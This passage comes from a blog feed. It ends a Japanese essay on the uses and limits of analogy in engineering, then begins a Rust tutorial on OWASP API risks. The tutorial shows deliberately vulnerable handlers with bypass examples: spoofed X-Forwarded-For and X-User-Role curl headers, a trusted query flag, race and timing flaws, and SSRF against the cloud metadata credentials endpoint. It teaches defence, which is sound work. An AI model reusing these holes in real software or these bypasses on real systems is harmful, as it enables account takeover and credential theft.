とは、プログラムの変更履歴を記録・管理するツールだ。SVNは「中央のサーバーにすべてを保存する」方式だったが、Gitは「全員が完全な履歴を持つ」方式を採用した。「すべてのリポジトリが対等なピアである」という考え方は、P2Pネットワークの構造と同じだ。Dockerのコンテナ技術は、仮想マシンの重さを、プロセス分離の軽さで置き換えた。Dockerとは、アプリケーションを「コンテナ」という小さな箱に詰めて、どこでも同じように動かせるツールだ。「OSレベルの仮想化ではなく、プロセスレベルの分離で十分ではないか」という発想が、コンテナ革命を起こした。MapReduceは、分散処理の複雑さを、関数型プログラミングの抽象で単純化した。これは大量のデータを複数のコンピュータで並列処理するための手法だ。「mapとreduceという2つの操作に分解すれば、並列処理が簡単になる」。この類推が、ビッグデータ処理の基盤を作った。類推は、新しい価値を生むための道具だ。既存の枠組みを超えるための、ジャンプ台だ。だから、類推を完全に否定できない。エンジニアリングにおける類推の両面性ここまで、類推の力と危険について見てきた。類推は強力だ。でも、危険でもある。では、エンジニアとして、類推をどう扱うべきか。答えは、場面によって使い分けることだ。 類推が有効な場面と、危険な場面がある。それを見極めることが重要だ。類推が有効な場面まず、類推が有効な場面を整理しよう。新しい技術を学ぶとき。 前に学んだ技術との類似点を見つけることで、学習が加速する。「Goのgoroutine（ゴルーチン）は、軽量なスレッドみたいなものか」。スレッドとは、プログラムの中で同時に動く処理の単位だ。goroutineはそれをより少ないメモリで実現する。この類推が、入り口になる。チームメンバーに説明するとき。 相手が知っている概念に置き換えることで、理解を助ける。「このアーキテクチャは、マイクロサービスというより、モジュラーモノリスに近いよ」。問題を発見するとき。 「これは前にやったあのプロジェクトに似ている」と気づくことで、早期に問題を予測できる。パターン認識だ。アイデアを発想するとき。 異なる領域の解決策を、目の前の問題に適用してみる。「他の業界ではどうやっているんだろう」。これらの場面では、類推は強力なツールだ。類推が危険な場面一方で、類推が危険な場面もある。共通点は、「判断」が伴う場面だ。設計判断を下すとき。 「あの有名な会社がこうやっているから」は、判断の根拠にならない。なぜか。あの会社にはあの会社の文脈がある。規模、チーム構成、ビジネス要件、技術的制約——すべてが違う。自分たちの文脈で、自分たちの制約を考慮して、判断しなければならない。パフォーマンス予測をするとき。 「前のプロジェクトではこのくらいのスループットだったから」は、予測の根拠にならない。ハードウェアが違う。データが違う。負荷パターンが違う。実測なしに類推で判断すると、本番環境で痛い目に遭う。チーム運営をするとき。 「前のチームではうまくいったから」は、根拠にならない。人が違う。状況が違う。目の前のチームを、目の前のチームとして見なければならない。ビジネス判断をするとき。 「あの会社がこうやって成功したから」は、根拠にならない。市場が違う。タイミングが違う。リソースが違う。「マイクロサービスが流行っているから、うちもマイクロサービスにしよう」。これも類推だ。でも、マイクロサービスが成功した会社と、あなたの会社は違う。チームの規模が違う。運用能力が違う。ビジネスの複雑さが違う。流行りのアーキテクチャは、流行っている理由があるが、あなたの問題を解決する保証はない。「TDD（テスト駆動開発：テストを先に書いてから本体コードを書く開発手法）がいいらしいから、TDDでやろう」。これも類推だ。TDDが有効だった文脈と、今の文脈は同じか。チームのスキルは。締め切りは。要件の安定度は。手法は、文脈とセットでしか評価できない。これらの場面では、類推に頼らず、具体を見なければならない。具体を見ろここまでの話から、私がたどり着いた結論はシンプルだ。類推は入り口として使う。でも、入ったら、具体を見る。どういうことか。「これはAみたいなものだ」と類推したら、まずはその類推で全体像を掴む。ここまでは類推の力だ。でも、判断を下す前に、次の問いを立てる。「Aとは何が違うんだろう」。違いを具体的に列挙する。その違いが、判断にどう影響するかを考える。つまり、抽象ではなく、具体を見る。パターンではなく、個別を見る。類似ではなく、差異を見る。これは、類推の否定ではない。類推の限界を知った上で、類推を使うということだ。類推は入り口として使い、判断は具体に基づいて行う。入り口と判断を、分離する。 これが、私の結論だ。類推を使い分ける技術「入り口と判断を分離する」と言った。では、具体的にどうすればいいのか。私が実践していることを、いくつか紹介する。類推のレベルを意識するまず、自分がどのレベルで類推しているかを意識することだ。類推には、レベルがある。表面的な類推：見た目や印象の類似。「両方とも丸い」「両方ともウェブサービスだ」。機能的な類推：役割や機能の類似。「両方ともユーザー認証する」「両方ともデータを永続化する」。構造的な類推：関係性のパターンの類似。「Aの中でXとYの関係が、Bの中でPとQの関係と同じだ」。原理的な類推：根底にある原理の類似。「両方とも、この物理法則に従う」「両方とも、この経済原理が働く」。レベルが深いほど、類推は有効だ。表面的な類推は危険だ。原理的な類推は強力だ。類推をするとき、自分がどのレベルで類推しているかを意識する。表面的な類推に気づいたら、警戒する。反例を積極的に探す類推が成立しない場面を、積極的に探す。「これはAみたいだ」と思ったら、「Aとは違う点は何か」を列挙する。「この類推が成立しない条件は何か」を考える。「Aでは成立したが、ここでは成立しないことは何か」を洗い出す。なぜ反例を探すのか。人間は、類推が成立する証拠ばかりを集める傾向がある。心理学では「確証バイアス」と呼ばれる現象だ。自分が信じたいことを裏付ける情報ばかりを無意識に集めてしまう。「似ている」と感じると、似ている点ばかり目につく。違う点は、無意識にスルーしてしまう。だから、意識的に反例を探さなければならない。反例は、自然には目に入ってこない。反例が見つかったら、類推の適用範囲を限定する。「この側面ではAに似ているが、この側面では違う」と認識する。反例を探すことは、類推を否定することではない。類推を精密にすることだ。どこまで使えて、どこから使えないのか。その境界線を引く作業だ。類推と実測を組み合わせる類推は仮説だ。仮説は検証しなければならない。私は何度も、類推を信じて痛い目を見てきた。「分かった」と思った瞬間が、一番危ない。類推は、分からないことを「分かったつもり」にさせてくれる。その確信が、検証を怠らせる。大切なのは、分かっていないことに確信を持たないことだ。類推で「たぶんこうだろう」と思っても、それは仮説でしかない。仮説に確信を持ってはいけない。確信を持った瞬間、検証しなくなる。検証しなければ、間違いに気づけない。だから、私は自分にこう言い聞かせている。類推したら、試せ。作ってみろ。動かしてみろ。「前のプロジェクトと同じくらいのパフォーマンスだろう」と類推したら、実測する。「このアーキテクチャパターンがうまくいくだろう」と類推したら、プロトタイプ（動作確認のための試作品）を作る。「このチーム運営方法が有効だろう」と類推したら、小さく試して観察する。試した結果、類推が外れることがある。むしろ、外れることの方が多い。でも、外れたときこそ、学びがある。なぜ外れたのか。どこが似ていて、どこが違ったのか。その差異を言語化できたとき、理解が一段深まる。私は、このサイクルを速く回すことを意識している。1回の大きな検証より、10回の小さな検証。外れることを恐れない。外れるたびに、類推が精密になっていく。類推は「似ている」という感覚に基づいている。でも、感覚は当てにならない。似ていると思っても、実際には違う。逆に、違うと思っても、実際には同じ。感覚を信じすぎると、現実を見誤る。実測は、感覚を現実に引き戻す。「本当にそうなのか？」を確認する。類推で仮説を立てて、実測で検証する。 類推は仮説生成の道具であって、証明の道具ではない。複数の類推を比較する1つの類推に固執しない。複数の類推を試す。「これはAみたいだ」と思ったら、「でも、Bみたいでもあるな」と考える。「Cという見方もできるな」と広げる。なぜ複数の類推を試すのか。最初に思いついた類推が、最適とは限らない。むしろ、最初の類推は表面的なことが多い。パッと見て似ているから、思いつく。でも、もう少し考えると、別の類推の方が本質を捉えていることがある。1つの類推に決め打ちすると、その視点でしか見えなくなる。複数の類推を並べると、それぞれの限界が見えてくる。そして、どの類推が最も適切かを吟味する。どの類推が、最も多くの側面を説明できるか。どの類推が、最も少ない反例を持つか。どの類推が、最も有用な洞察を与えるか。複数の類推を比較することで、1つの類推に囚われることを防ぐ。類推を言語化する類推を曖昧なまま使わない。明示的に言語化する。「これはAみたいだ」と思ったら、何がどうAに似ているのか、具体的に言葉にする。「Aのこの側面と、ここのこの側面が、この点で類似している」と。なぜ言語化が重要なのか。頭の中にある類推は、たいてい曖昧だ。「なんとなく似ている」という感覚で止まっている。でも、言葉にしようとすると、曖昧さが露呈する。「どこが似ているの？」と聞かれて、答えられない。言語化は、自分の思考を試すテストだ。 言葉にできないなら、実はわかっていない。言葉にできて初めて、本当に理解したと言える。言語化することで、類推が精密になる。曖昧な類推は、誤解を生む。精密な類推は、理解を深める。そして、言語化した類推を、他者に共有する。「私はこう類推しているが、どうだろうか」と問う。他者の視点で、類推の妥当性を検証する。類推力を鍛えるここまで、類推の力と限界について語ってきた。では、類推力を高めるには、どうすればいいのか。私が意識していることを3つ挙げる。1つ目は、遠い領域から引き出しを増やすことだ。私は、咀嚼しやすいものばかり読まないようにしている。数学や哲学、物語やSFなどの自分の仕事や語ることとは遠い世界のストーリーを読んで、自分の経験と照らし合わせる。実生活では役に立たないように見える抽象的な知識こそ、遠くから借りてくる力になる。なぜ遠い領域が大事なのか。近い領域の知識は、みんなが持っている。だから、そこから類推しても、みんなと同じ結論にしかたどり着かない。遠い領域の知識は、自分だけの武器になる。他の人が思いつかない類推ができる。2つ目は、常に「これは何かに使えないか」と考えることだ。映画を見ても、歴史を学んでも、スポーツを観戦しても、「これは自分の仕事にどう活かせるか」と考える。「関係ない」と決めつけず、「何か応用できないか」という視点で世界を見る。これを続けていると、頭の中に「類推のアンテナ」が立つ。普段の生活の中で、ふと「あ、これって、あれと同じだ」と気づくようになる。その瞬間が、類推力が育っている証拠だ。3つ目は、構造を2〜3つに絞って抽象化することだ。私の経験では、特徴や要点を2〜3つ挙げて、同じ構造を持つ事象を探すとうまくいく。1つだと何でも結びつけられてしまう。「両方とも存在する」では、類推にならない。4つ以上だと類推先が近くなりすぎて面白味がない。条件が厳しすぎて、同じ業界の似たようなものしか見つからない。2〜3つが、ちょうどいい。適度に絞られていて、適度に広い。この訓練を続けると、世界の見え方が変わる。一見無関係に見えるものの中に、共通の構造が見えてくる。私は、この感覚を得てから、仕事がずっと面白くなった。ニュースを読んでも、本を読んでも、人と話しても、「これは何かに使えるだろう」と思う。世界が、類推のネタの宝庫に見えてくる。類推を断つ勇気ここまで、類推を使い分ける技術について書いてきた。でも、もっと根本的なことがある。それは、類推を断つ勇気だ。一度つなげた類推を、必要なら断たなければならない。でも、これが難しい。なぜ難しいのか。類推は、理解の構造だ。「これはAみたいなものだ」という認識は、思考の足場になっている。その足場の上に、さらに理解を積み重ねている。足場を外すことは、その上に積み重ねたものも崩れることを意味する。一度「わかった」と思ったものを、「わからない」に戻すのは、心理的に辛い。人間は「わかった」状態を好む。「わからない」状態は不安だ。だから、間違った類推でも、手放したくない。間違っていると薄々気づいていても、「まあ、だいたい合っているだろう」と自分を納得させてしまう。認めたくない。また、類推は、コミュニケーションの基盤にもなる。チームで「これはAみたいなもの」と共有されていると、それを覆すことは、混乱を生む。「え、今までの説明は何だったの？」と言われる。自分の言ったことを訂正するのは、恥ずかしい。間違いを認めるのは、プライドが傷つく。だから、間違っているとわかっても、言い出せない。みんなが使っている類推に異を唱えるのは、勇気がいる。でも、間違った類推に固執し続けることの方が、はるかに有害だ。 間違った類推は、間違った判断を生む。間違った判断は、間違った設計を生む。間違った設計は、技術的負債を生む。技術的負債とは、急いで作った不完全なコードが後から修正コストとして跳ね返ってくることだ。借金のように、放置すればするほど利子が膨らんでいく。技術的負債は、チームを疲弊させる。最初の一歩で間違えると、その後のすべてがズレていく。早く気づいて修正するほど、傷は浅い。だから、類推が間違っていると気づいたら、勇気を持って断つ。「前にAみたいだと言ったけど、よく見たら違った。Bで考え直そう」と言う。これは、弱さではない。強さだ。現実を直視する強さだ。おわりに冒頭の話に戻ろう。私は、Rustの所有権を「本の貸し借りみたいなもの」と理解した。その類推で入り口は開けた。でも、その類推に縛られて、ライフタイムの本質を見誤った。非同期処理を料理に例えて、リソース競合を甘く見た。トランザクションを銀行振込に例えて、ロールバックの複雑さに気づかなかった。キャッシュを「手元に置く」と理解して、無効化の難しさを軽視した。私は、何度も同じ失敗を繰り返してきた。正直に言えば、私は今でも類推を使う。毎日のように使う。「これって、あれみたいだな」と考える癖は、もはや私の一部だ。類推なしに思考することなど、私にはできない。たぶん、誰にもできない。でも、これらの経験を経て、私は類推の使い方を変えた。類推は入り口として使う。入ったら、具体を見る。 「本の貸し借りみたいなもの」で入ったら、次に「でも、貸し借りと違って、所有権を渡したら元の変数からは完全にアクセスできなくなる。貸した相手を追跡する仕組みはない」と自分に言い聞かせる。類推と差異を、セットで意識する。そして、類推が成り立たない場面に出会ったら、類推を修正する勇気を持つ。類推は、人間の知能の基盤だ。われわれは類推なしには思考できない。だから、類推を否定するつもりはない。否定できるはずもない。でも、類推の限界を知らなければならない。類推は万能ではない。類推は常に成立するとは限らない。表面的な類推は、本質的な差異を見落とす。類推で入って、具体で判断する。類推は仮説であって、証明ではない。類推を絶対視せず、反例を探し、実測で検証する。そして、間違った類推は、勇気を持って断つ。これが、エンジニアとしての類推の使い方だ。「それって、○○みたいなものですよね」。この言葉を使うとき、私は今、一瞬立ち止まる。「本当にそうか？」と自問する。表面的な類似に惑わされていないか。本質的な差異を見落としていないか。先日、後輩にRustの所有権を説明する機会があった。私は「本の貸し借りみたいなものなんだけど」と言った後、こう続けた。「ただし、本と違って、Rustでは貸した先を追跡する仕組みはない。完全に手放すか、借用するかの二択なんだ」。あの頃の自分には、この補足ができなかった。類推は強力だ。だからこそ、慎重に扱わなければならない。おい、類推するな。いや、違う。類推しろ。でも、類推を疑え。類推で入って、具体で確かめろ。そして、間違っていたら、断つ勇気を持て。それが、類推に救われ、類推に何度も裏切られ、それでも類推を愛する人間からの、静かな呼びかけだ。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。参考書籍The Rust Programming Language, 3rd Edition (English Edition)作者:Klabnik, Steve,Nichols, Carol,Krycho, ChrisNo Starch PressAmazonプログラミングRust 第2版作者:Jim Blandy,Jason Orendorff,Leonora F.S. TindallオライリージャパンAmazonバックエンドエンジニアを目指す人のためのRust作者:安東 一慈,大西 諒,徳永 裕介,中村 謙弘,山中 雄大翔泳社Amazon類似と思考　改訂版 (ちくま学芸文庫)作者:鈴木宏昭筑摩書房Amazonアナロジー思考作者:細谷 功東洋経済新報社Amazon問題解決力を高める「推論」の技術作者:羽田康祐k_birdフォレスト出版Amazon新装版　アブダクション: 仮説と発見の論理作者:米盛 裕二勁草書房Amazon作る、試す、正す。　アジャイルなモノづくりのための全体戦略作者:市谷 聡啓ビー・エヌ・エヌAmazon","isoDate":"2025-12-05T21:02:08.000Z","dateMiliSeconds":1764968528000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"RustでOWASP API Security Top 10を体験する（後編）：リソース制御と攻撃検知","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/06/055637","contentSnippet":"この記事は、Rust Advent Calendar 2025 6日目のエントリ記事です。はじめに前編からの続き ← API1 (BOLA), API2 (Broken Authentication), API3 (Mass Assignment)の解説はこちら前編では認証・認可の基礎とデータ保護について解説した。後編では、リソース消費制御、機能レベルの認可、そしてサーバーサイド攻撃について体験していく。API4: Rate Limit - 総当たり攻撃対策パスワードクラッキング（パスワードを片っ端から試して突破する攻撃）の現実を体験できるデモ。owasp.orgなぜレート制限が重要なのかレート制限とは、「一定時間内に受け付けるリクエスト数を制限する」仕組みだ。レート制限がないAPIは「無限に試行できる」ことを意味する。 攻撃手法  被害  レート制限での防御  パスワード総当たり  アカウント乗っ取り  試行回数制限  クレデンシャルスタッフィング  流出パスワードでの不正ログイン  IPベースのブロック  OTPブルートフォース  2段階認証（SMS認証など）のバイパス  アカウントロック  APIの過剰呼び出し  サービス停止（DoS）  グローバルレート制限  スクレイピング  データの大量取得  リクエスト間隔の強制 パスワードクラッキングの数学4桁のPINコードを総当たりする時は以下のようになる。組み合わせ: 104 = 10,000通り毎秒10回の試行 → 約17分で全組み合わせを試行レート制限なし → 毎秒1000回で10秒8文字のパスワード（小文字+数字）の時は以下のようになる。組み合わせ: 368 ≒ 2.8兆通り毎秒1000回でも約89年かかるでも、辞書攻撃なら数万語 → 数分で完了レート制限は「総当たりを現実的に不可能にする」ための防御だ。cargo run --release --bin rate-limit-demoでは、実際にどうやってレート制限を実装するのか。単純に「1分間に10回まで」と制限すればいいように思えるが、攻撃者はそう甘くない。IPアドレスを変えながら攻撃したり、複数のアカウントを同時に狙ったりする。だから、防御も複数の観点から行う必要がある。二層の防御：IP追跡とアカウント追跡/// Tracks login attempts per IP address#[derive(Debug, Clone)]struct LoginAttemptTracker {    /// IP -> (attempt_count, first_attempt_time)    ip_attempts: Arc<RwLock<HashMap<String, (u32, Instant)>>>,    /// Email -> (attempt_count, first_attempt_time)    account_attempts: Arc<RwLock<HashMap<String, (u32, Instant)>>>,    /// Blocked IPs    blocked_ips: Arc<RwLock<Vec<String>>>,    /// Locked accounts    locked_accounts: Arc<RwLock<Vec<String>>>,}なぜ二層必要なのか。IP追跡のみだと、攻撃者がVPNやTorでIP変えながら攻撃できるアカウント追跡のみだと、1つのIPから多数のアカウントを攻撃できる両方で、どちらのパターンも防げるスライディングウィンドウの実装fn record_attempt(&self, ip: &str, email: &str) -> (u32, u32) {    let window = Duration::from_secs(300); // 5分間のウィンドウ    let now = Instant::now();    // Track IP attempts    let ip_count = {        let mut attempts = self.ip_attempts.write().unwrap();        let entry = attempts.entry(ip.to_string()).or_insert((0, now));        if now.duration_since(entry.1) > window {            // 5分経過したらリセット            *entry = (1, now);        } else {            entry.0 += 1;        }        entry.0    };    // Block IP after 10 attempts    if ip_count >= 10 {        let mut blocked = self.blocked_ips.write().unwrap();        if !blocked.contains(&ip.to_string()) {            blocked.push(ip.to_string());            tracing::warn!(ip = ip, \\"IP blocked due to too many attempts\\");        }    }    // Lock account after 5 attempts    if account_count >= 5 {        // ...    }    (ip_count, account_count)}governorクレートによるグローバルレート制限// Global rate limiter: 10 requests per secondlet rate_limiter = Arc::new(RateLimiter::direct(Quota::per_second(    NonZeroU32::new(10).unwrap(),)));governorはトークンバケットアルゴリズムを実装している。これは「バケツに水が溜まっていく」イメージだ。バケットに毎秒10トークン補充され、リクエストごとに1トークン消費。バケットが空になったら429（Too Many Requests）を返す。脆弱 vs 安全/// VULNERABLE: Login endpoint without rate limitingasync fn vulnerable_login(Json(req): Json<LoginRequest>) -> Result<Json<LoginResponse>, AppError> {    // 何回でも試行可能！    if req.email == \\"user@example.com\\" && req.password == \\"password123\\" {        Ok(Json(LoginResponse { /* ... */ }))    } else {        Err(AppError::Unauthorized)    }}/// SECURE: Login endpoint with rate limiting and lockoutasync fn secure_login(    State(state): State<AppState>,    ConnectInfo(addr): ConnectInfo<SocketAddr>,    Json(req): Json<LoginRequest>,) -> Result<Json<LoginResponse>, (StatusCode, Json<RateLimitError>)> {    let ip = addr.ip().to_string();    // 1. グローバルレート制限    if state.rate_limiter.check().is_err() {        return Err((StatusCode::TOO_MANY_REQUESTS, /* ... */));    }    // 2. IPブロック確認    if state.tracker.is_ip_blocked(&ip) {        return Err((StatusCode::TOO_MANY_REQUESTS, /* ... */));    }    // 3. アカウントロック確認    if state.tracker.is_account_locked(&req.email) {        return Err((StatusCode::TOO_MANY_REQUESTS, /* ... */));    }    // 4. 認証処理    if req.email == \\"user@example.com\\" && req.password == \\"password123\\" {        state.tracker.reset_on_success(&ip, &req.email); // 成功したらカウンターリセット        Ok(Json(LoginResponse { /* ... */ }))    } else {        state.tracker.record_attempt(&ip, &req.email); // 失敗を記録        Err((StatusCode::UNAUTHORIZED, /* ... */))    }}微妙な脆弱性：レート制限のバイパス手法「レート制限を実装したから安全」と思っていないだろうか。残念ながら、レート制限にもバイパス手法がたくさんある。微妙な脆弱性 #1: X-Forwarded-Forを信用する/// 開発者の意図: 「ロードバランサーの後ろにいるから、X-Forwarded-Forを使わないと」/// 現実: 攻撃者もX-Forwarded-Forを設定できるasync fn subtle_xff_bypass(headers: HeaderMap, ...) -> Result<...> {    // BUG: X-Forwarded-Forを無条件に信用    let ip = headers        .get(\\"X-Forwarded-For\\")        .and_then(|v| v.to_str().ok())        .and_then(|s| s.split(\',\').next())        .map(|s| s.trim().to_string())        .unwrap_or_else(|| addr.ip().to_string());    // 攻撃: curl -H \\"X-Forwarded-For: 1.2.3.4\\" ...    //       curl -H \\"X-Forwarded-For: 5.6.7.8\\" ...    // 毎回違うIPとしてカウントされる！    if state.tracker.is_ip_blocked(&ip) { /* ... */ }}X-Forwarded-Forは信頼できるプロキシ（ロードバランサーやCDNなど、自分たちが管理しているサーバー）からのみ受け入れるべきだ。信頼チェーンを確立せずにXFFを使うと、攻撃者がIPを自由に偽装できる。微妙な脆弱性 #2: 大文字小文字の不一致/// 開発者の意図: 「メールアドレスでアカウントロックを追跡」/// 現実: 大文字小文字で別アカウント扱いasync fn subtle_case_sensitivity(...) -> Result<...> {    // BUG: アカウントロックは大文字小文字を区別    if state.tracker.is_account_locked(&req.email) {        return Err(...);    }    // でも認証は大文字小文字を無視    let email_lower = req.email.to_lowercase();    if email_lower == \\"user@example.com\\" && req.password == \\"password123\\" {        // ...    }    // 攻撃:    // user@example.com で5回失敗 → ロック    // User@example.com で5回失敗 → 別カウント！    // USER@example.com で5回失敗 → また別カウント！    // 結果: 15回試行できる}アカウント識別子の正規化を一貫して行わないと、レート制限を回避される。微妙な脆弱性 #3: タイミングリーク/// 開発者の意図: 「ロックされたアカウントは早期リターン」/// 現実: レスポンス時間でアカウントの存在がわかるasync fn subtle_timing_leak(...) -> Result<...> {    // ロック済みアカウントは即座に拒否（速い！）    if state.tracker.is_account_locked(&req.email) {        return Err(/* 数マイクロ秒 */);    }    // パスワードハッシュ検証（遅い！）    tokio::time::sleep(Duration::from_millis(100)).await;    // 存在するアカウントは追加処理（もっと遅い！）    if account_exists(&req.email) {        tokio::time::sleep(Duration::from_millis(50)).await;    }    // 攻撃: レスポンス時間を測定    // 即座に返る → ロック済み（= 存在するアカウント）    // 100ms → 存在しないアカウント    // 150ms → 存在するが間違ったパスワード}レスポンス時間を均一にしないと、アカウント列挙攻撃に使われる。微妙な脆弱性 #4: TOCTOU競合/// 開発者の意図: 「カウンターを確認してから処理」/// 現実: 確認と更新の間に別のリクエストが入るasync fn subtle_race_condition(...) -> Result<...> {    // Step 1: カウンター読み取り（ロック解放）    let current_count = {        let attempts = state.tracker.ip_attempts.read().unwrap();        attempts.get(&ip).map(|(count, _)| *count).unwrap_or(0)    }; // ← ここでロック解放    // この間に並行リクエストが！    tokio::time::sleep(Duration::from_millis(10)).await;    // Step 2: 制限チェック（古い値で判断）    if current_count >= 10 {        return Err(...);    }    // Step 3: 処理後にカウンター更新    state.tracker.record_attempt(&ip, &req.email);    // 攻撃: 100並行リクエストを同時送信    // 全員が current_count = 0 で通過！}チェックと更新はアトミックに行うべき。RwLockではなくアトミック操作や、チェックと更新を1つのロック内で行う必要がある。API5: BFLA - 一般ユーザーが管理者になれてしまう問題前編でBOLA（Broken Object Level Authorization）を解説した。BOLAは「他人のデータにアクセスできてしまう」問題だった。では、「他人のデータ」ではなく「使えないはずの機能」にアクセスできてしまったら？それがBFLA（Broken Function Level Authorization）だ。owasp.orgBOLAが「他人のデータを見られる」なら、BFLAは「使えないはずの機能が使える」。例えば、一般ユーザーが管理者用のユーザー一覧APIを叩けてしまうケース。言ってみれば「平社員が社長の権限でシステムを操作できる」状態だ。BOLAとBFLAの違いを理解するこの2つは混同しやすいので、明確に区別しよう。 項目  BOLA  BFLA  何が壊れているか  オブジェクト（データ）へのアクセス制御  機能（エンドポイント）へのアクセス制御  攻撃例  BobがAliceの注文を見る  一般ユーザーが管理者APIを叩く  チェック対象  「このデータは誰のものか」  「この機能は誰が使えるか」  典型的な対策  リソースごとの所有者チェック  ロール/権限チェック 例えで言えばこうだ。BOLA = 他人のロッカーを開けられる（同じ権限レベル内での越境）BFLA = 社員証がないのに役員室に入れる（権限レベルの越境）この違いを理解すると、なぜBFLAが発生しやすいのかも見えてくる。なぜBFLAが発生するのかエンドポイントの「発見」 - /api/usersがあるなら/api/admin/usersもあるだろうと攻撃者は考えるフロントエンドによる隠蔽への過信 - 「管理メニューは管理者にしか見せてないから大丈夫」→ APIは直接叩ける認証と認可の混同（再び） - 「ログインしてるから管理APIも使えるはず」という誤った思い込みテスト不足 - 管理者機能は管理者アカウントでしかテストしないドキュメント化されていない管理API - 「隠しAPI」は攻撃者に見つかる実際の被害パターンBFLAによって可能になる攻撃を挙げる。ユーザー情報の一括取得 - 全ユーザーのメールアドレス、個人情報を抜き取る権限昇格 - 自分のアカウントに管理者権限を付与するシステム設定の変更 - APIキーの再生成、課金設定の変更データの一括削除 - 管理者用の一括削除機能を悪用監査ログの改ざん - 証拠隠滅のためにログを消去では、脆弱なコードと安全なコードを見比べてみよう。/// VULNERABLE: No role checkasync fn vulnerable_list_users(user: AuthenticatedUser) -> Result<Json<Vec<UserInfo>>, AppError> {    Ok(Json(vec![        UserInfo {            id: 1,            email: \\"admin@example.com\\".to_string(),            role: \\"admin\\".to_string(),            ssn: \\"123-45-6789\\".to_string(), // SSNまで露出        },        // ...    ]))}/// SECURE: Admin checkasync fn secure_list_users(user: AuthenticatedUser) -> Result<Json<Vec<SafeUserInfo>>, AppError> {    if !is_admin(&user.0) {        return Err(AppError::Forbidden(\\"Admin permission required\\".to_string()));    }    // ...}is_adminのチェックは単純だ。pub fn is_admin(claims: &UserClaims) -> bool {    claims.permissions.iter().any(|p| p == \\"admin\\")}「これくらい誰でも書く」と考えるだろう。しかし、本番環境で「認証は通ってるから大丈夫」と言ってこのチェックを忘れる人が後を絶たない。微妙な脆弱性：一見正しく見えるBFLAのバグ「is_adminチェックさえ入れれば安全」と思っていないだろうか。残念ながら、そう単純ではない。微妙な脆弱性 #1: HTTPヘッダーを信用する/// 開発者の意図: 「フロントエンドが送るX-User-Roleヘッダーを信用しよう」/// 現実: curlでいくらでも偽装できるasync fn subtle_header_role_check(    user: AuthenticatedUser,    headers: HeaderMap,) -> Result<Json<AdminResponse>, AppError> {    // BUG: HTTPヘッダーを信用している！    let role = headers        .get(\\"X-User-Role\\")        .and_then(|v| v.to_str().ok())        .unwrap_or(\\"user\\");    if role != \\"admin\\" {        return Err(AppError::Forbidden(\\"Admin role required\\".to_string()));    }    // 攻撃: curl -H \\"X-User-Role: admin\\" ...    Ok(Json(admin_data))}フロントエンドから「便利だから」とヘッダーでロール情報を送る設計を見たことがある。これはアウトだ。HTTPヘッダーはクライアントが自由に設定できる。JWTのペイロードのように署名で保護されていない限り、信用してはいけない。微妙な脆弱性 #2: JWTクレームをDBと照合しない/// 開発者の意図: 「JWTに権限が入っているから、それを使えばOK」/// 現実: トークン発行後にユーザーが降格されたら？async fn subtle_client_claims_check(    user: AuthenticatedUser,) -> Result<Json<AdminResponse>, AppError> {    // これ、一見正しそう    let has_admin = user.0.permissions.iter().any(|p| p == \\"admin\\");    if !has_admin {        return Err(AppError::Forbidden(\\"Admin permission required\\".to_string()));    }    // 問題: ユーザーが管理者だったのは「トークン発行時」の話    // トークン発行後に降格されていても、トークンが有効な限りアクセスできてしまう    Ok(Json(admin_data))}JWT（JSON Web Token）は便利だが、「トークン発行時点のスナップショット」に過ぎない。JWTとは、ユーザー情報や権限を暗号化して埋め込んだトークンで、サーバーはDBを参照せずに認証できる。しかし、ユーザーの権限が変更されたら、古いトークンは無効にするか、DBで再確認する必要がある。微妙な脆弱性 #3: 大文字小文字の罠/// 開発者の意図: 「adminをチェックすれば安全」/// 現実: 「Admin」「ADMIN」「aDmIn」は？let has_admin = user.0.permissions.iter().any(|p| p == \\"admin\\");これ自体は問題ないが、トークン生成側で大文字小文字の統一が取れていないと問題になる。ある箇所では\\"admin\\"、別の箇所では\\"Admin\\"で権限が付与されていたら、チェックをすり抜けてしまう。// 安全な実装: 大文字小文字を無視let has_admin = user.0.permissions.iter()    .any(|p| p.eq_ignore_ascii_case(\\"admin\\"));微妙な脆弱性 #4: キャッシュされた権限チェック/// 開発者の意図: 「ミドルウェアで権限チェック済みだから、エンドポイントでは確認不要」/// 現実: そのキャッシュ、どこから来た？async fn subtle_cached_permission_check(    user: AuthenticatedUser,    Query(query): Query<CachedCheckQuery>,) -> Result<Json<AdminResponse>, AppError> {    // BUG: クエリパラメータから「チェック済み」フラグを読んでいる！    let is_verified_admin = query.permission_verified.unwrap_or(false);    if is_verified_admin {        // 攻撃: ?permission_verified=true        return Ok(Json(admin_data));    }    // 本来のチェック    if !is_admin(&user.0) {        return Err(AppError::Forbidden(\\"Admin permission required\\".to_string()));    }    Ok(Json(admin_data))}「ミドルウェアでチェック済み」というフラグをリクエストに含めるパターンは意外とある。でもそのフラグがクエリパラメータやヘッダーから来ていたら、攻撃者が自由に設定できる。API7: SSRF - サーバーを踏み台にするSSRF（Server-Side Request Forgery）は、サーバーに「代わりにリクエストを送らせる」攻撃だ。普通、攻撃者は外部から内部ネットワークにアクセスできない。でも、サーバーは内部ネットワークにアクセスできる。だから、サーバーを「踏み台」にして、内部ネットワークに攻撃を仕掛けるのがSSRFだ。owasp.orgたとえるなら、「社員に偽の指示書を渡して、機密書類を持ってこさせる」ようなものだ。社員（サーバー）は指示書が正当なものだと思い込んで、機密エリアにアクセスしてしまう。SSRFの危険性を理解するSSRFが特に危険な理由を説明する。ファイアウォールをバイパス - 外部からは遮断されていても、内部からのリクエストは通るクラウドメタデータにアクセス - AWS/GCPの169.254.169.254（クラウド環境で自動的に提供される情報サービス）から認証情報を取得可能内部サービスの探索 - ポートスキャンや内部APIの発見に悪用認証のバイパス - 「内部ネットワークからのアクセスは信頼」という設計を悪用特に2番目の「クラウドメタデータへのアクセス」は、現代のクラウド環境では致命的な被害につながる。なぜなら、メタデータサービスには一時的な認証情報が含まれているからだ。クラウド環境での致命的な被害クラウド環境でのSSRFは特に危険だ。2019年のCapital One事件では、SSRFを使ってAWSのメタデータサービスにアクセスし、1億人以上の顧客データが漏洩した。攻撃の流れを見てみよう。1. 攻撃者: http://169.254.169.254/latest/meta-data/iam/security-credentials/ にアクセスさせる2. サーバー: 内部からのリクエストなので通常通り処理3. AWSメタデータ: IAMロールの一時認証情報を返す4. 攻撃者: その認証情報でS3バケットにアクセス → 